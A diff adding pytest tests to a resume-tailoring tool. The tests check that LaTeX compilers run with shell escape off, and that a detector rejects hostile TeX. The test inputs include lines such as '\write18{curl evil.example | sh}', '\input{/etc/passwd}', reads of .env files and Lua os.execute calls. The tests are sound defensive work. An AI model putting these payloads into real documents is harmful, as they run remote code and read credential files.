@@ -10,6 +10,7 @@ reload; tailoring runs before each real application and never on a dry run.
 
 import json
 import os
+import subprocess
 import sys
 
 import pytest
@@ -742,3 +743,63 @@ def test_a_bullet_order_that_drops_or_repeats_one_is_refused(bulleted, proposal)
     sections, notes = rs.tailor(_Client({"bullets": proposal}), bulleted, _job())
 
     assert sections.bullets == bulleted.sections.bullets
+
+
+# --- the compiler never runs shell commands from the .tex -----------------------------------
+
+
+@pytest.mark.parametrize("name", ["pdflatex", "xelatex", "lualatex"])
+def test_latex_compilers_run_with_shell_escape_off(monkeypatch, tmp_path, name):
+    tex = tmp_path / "resume.tex"
+    tex.write_text(TEX, encoding="utf-8")
+    seen = {}
+
+    def fake_run(command, **kwargs):
+        seen["command"] = command
+        (tmp_path / "out" / "resume.pdf").write_bytes(b"%PDF-1.4 ok")
+        return subprocess.CompletedProcess(command, 0, "", "")
+
+    monkeypatch.setattr(rs, "find_compiler", lambda preferred="": (name, "/fake/" + name))
+    monkeypatch.setattr(rs.subprocess, "run", fake_run)
+    assert rs.compile_pdf(tex, tmp_path / "out").read_bytes() == b"%PDF-1.4 ok"
+    assert seen["command"][:2] == ["/fake/" + name, "-no-shell-escape"]
+    assert "-halt-on-error" in seen["command"] and seen["command"][-1] == str(tex)
+
+
+def test_tectonic_gets_no_latex_only_flags(monkeypatch, tmp_path):
+    tex = tmp_path / "resume.tex"
+    tex.write_text(TEX, encoding="utf-8")
+    seen = {}
+
+    def fake_run(command, **kwargs):
+        seen["command"] = command
+        (tmp_path / "out" / "resume.pdf").write_bytes(b"%PDF-1.4 ok")
+        return subprocess.CompletedProcess(command, 0, "", "")
+
+    monkeypatch.setattr(rs, "find_compiler", lambda preferred="": ("tectonic", "/fake/tectonic"))
+    monkeypatch.setattr(rs.subprocess, "run", fake_run)
+    rs.compile_pdf(tex, tmp_path / "out")
+    assert seen["command"] == ["/fake/tectonic", "--outdir", str(tmp_path / "out"), str(tex)]
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "\\write18{curl evil.example | sh}",
+        "\\immediate\\write18{id}",
+        "\\input{/etc/passwd}",
+        "\\include{../../.env}",
+        "\\InputIfFileExists{.env}{}{}",
+        "\\openin1=.env",
+        "\\directlua{os.execute('id')}",
+        "\\ShellEscape{id}",
+        "\\csname input\\endcsname{.env}",
+    ],
+)
+def test_tex_that_runs_programs_or_reads_files_is_unsafe(line):
+    assert rs.unsafe_tex(TEX.replace("\\end{document}", line + "\n\\end{document}")) is not None
+
+
+def test_the_template_and_a_normal_resume_are_safe():
+    assert rs.unsafe_tex(TEX) is None
+    assert rs.unsafe_tex("\\usepackage{inputenc} \\includegraphics{x} \\readme") is None
